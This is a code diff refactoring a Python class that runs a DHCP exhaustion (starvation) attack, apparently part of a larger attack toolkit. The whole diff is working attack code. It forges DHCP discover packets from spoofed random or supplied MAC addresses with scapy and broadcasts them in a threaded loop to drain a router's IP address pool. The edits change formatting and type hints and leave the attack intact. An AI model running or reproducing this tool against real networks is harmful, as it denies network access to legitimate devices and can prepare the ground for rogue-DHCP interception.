@@ -1,22 +1,29 @@
 import random
-import time
-import threading
 import re
-from typing import List
-from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sendp
-from .base_attack import BaseAttack
+import threading
+import time
 from collections import deque
+from typing import List, Optional
+
+from scapy.all import BOOTP, DHCP, IP, UDP, Ether, sendp
+from scapy.packet import Packet
+
+from .base_attack import BaseAttack
+
 
 class DHCPExhaustion(BaseAttack):
     """Simulate multiple DHCP clients to exhaust router's IP pool"""
-    
-    def __init__(self, interface: str,
-                 num_devices: int = 50,
-                 request_options: List[int] = None,
-                 client_src: List[str] = None):
+
+    def __init__(
+        self,
+        interface: str,
+        num_devices: int = 50,
+        request_options: Optional[List[int]] = None,
+        client_src: Optional[List[str]] = None,
+    ):
         """
         Initialize DHCP exhaustion attack
-        
+
         :param num_devices: Number of fake devices to simulate
         """
         super().__init__(interface)
@@ -24,9 +31,12 @@ class DHCPExhaustion(BaseAttack):
             raise ValueError("Number of devices must be at least 1")
         self.num_devices = num_devices
         self.request_options = request_options or list(range(81))
-        self.client_src = self._validate_macs(client_src) if client_src else None
-        self.mac_pool = deque(self.client_src) if client_src else None
-        self.sent_macs = set()
+        self.client_src: List[str] = (
+            self._validate_macs(client_src) if client_src else []
+        )
+        # Always create a deque, even if empty
+        self.mac_pool: deque[str] = deque(self.client_src)
+        self.sent_macs: set[str] = set()
         self.lock = threading.Lock()
 
     def _validate_macs(self, mac_list: List[str]) -> List[str]:
@@ -41,7 +51,7 @@ class DHCPExhaustion(BaseAttack):
                     "Valid format: '01:23:45:67:89:ab' or '01-23-45-67-89-ab'"
                 )
             # Normalize to lowercase with colons
-            normalized = mac.lower().replace('-', ':')
+            normalized = mac.lower().replace("-", ":")
             validated.append(normalized)
 
         return validated
@@ -56,33 +66,39 @@ class DHCPExhaustion(BaseAttack):
         # Fallback to random generation
         while True:
             mac = "de:ad:%02x:%02x:%02x:%02x" % (
-                random.randint(0, 0xff),
-                random.randint(0, 0x7f),
-                random.randint(0, 0xff),
-                random.randint(0, 0xff)
+                random.randint(0, 0xFF),
+                random.randint(0, 0x7F),
+                random.randint(0, 0xFF),
+                random.randint(0, 0xFF),
             )
             if mac not in self.sent_macs:
                 self.sent_macs.add(mac)
                 return mac
 
-    def _validate_options(self):
+    def _validate_options(self) -> None:
         """Ensure requested options are valid DHCP option codes"""
         if not all(0 <= opt <= 255 for opt in self.request_options):
             raise ValueError("DHCP options must be between 0-255")
 
-    def _create_dhcp_packet(self):
+    def _create_dhcp_packet(self) -> Packet:
         """Build DHCP discovery packet"""
         mac = self._generate_mac()
-        return Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / \
-               IP(src="0.0.0.0", dst="255.255.255.255") / \
-               UDP(sport=68, dport=67) / \
-               BOOTP(chaddr=mac) / \
-               DHCP(options=[("message-type", "discover"), 
-                            ("client_id", mac),
-                            ("param_req_list", self.request_options),
-                            "end"])
+        return (
+            Ether(src=mac, dst="ff:ff:ff:ff:ff:ff")
+            / IP(src="0.0.0.0", dst="255.255.255.255")
+            / UDP(sport=68, dport=67)
+            / BOOTP(chaddr=mac)
+            / DHCP(
+                options=[
+                    ("message-type", "discover"),
+                    ("client_id", mac),
+                    ("param_req_list", self.request_options),
+                    "end",
+                ]
+            )
+        )
 
-    def _send_loop(self):
+    def _send_loop(self) -> None:
         """Main attack loop with rate limiting"""
         try:
             sent_count = 0
@@ -93,7 +109,10 @@ class DHCPExhaustion(BaseAttack):
             while self.running and sent_count < self.num_devices:
                 pkt = self._create_dhcp_packet()
                 sendp(pkt, iface=self.interface, verbose=False)
-                self.logger.info(f"Sent DHCP request from {pkt.src} ({sent_count+1}/{self.num_devices})")
+                self.logger.info(
+                    f"Sent DHCP request from {pkt.src}\
+                        ({sent_count+1}/{self.num_devices})"
+                )
                 sent_count += 1
                 time.sleep(delay)
 
@@ -105,7 +124,7 @@ class DHCPExhaustion(BaseAttack):
             self.logger.error(f"DHCP loop error: {str(e)}")
             self.stop()
 
-    def start(self):
+    def start(self) -> None:
         """Launch attack thread"""
         if not self.running:
             self.running = True
@@ -113,11 +132,14 @@ class DHCPExhaustion(BaseAttack):
             self.thread.start()
             self.logger.info(f"Started DHCP exhaustion with {self.num_devices} devices")
 
-    def stop(self):
+    def stop(self) -> None:
         """Stop attack thread"""
         self.running = False
         # only join if called from a different thread
-        if self.thread and self.thread.is_alive() \
-           and threading.current_thread() is not self.thread:
+        if (
+            self.thread
+            and self.thread.is_alive()
+            and threading.current_thread() is not self.thread
+        ):
             self.thread.join()
         self.logger.info("DHCP exhaustion stopped")
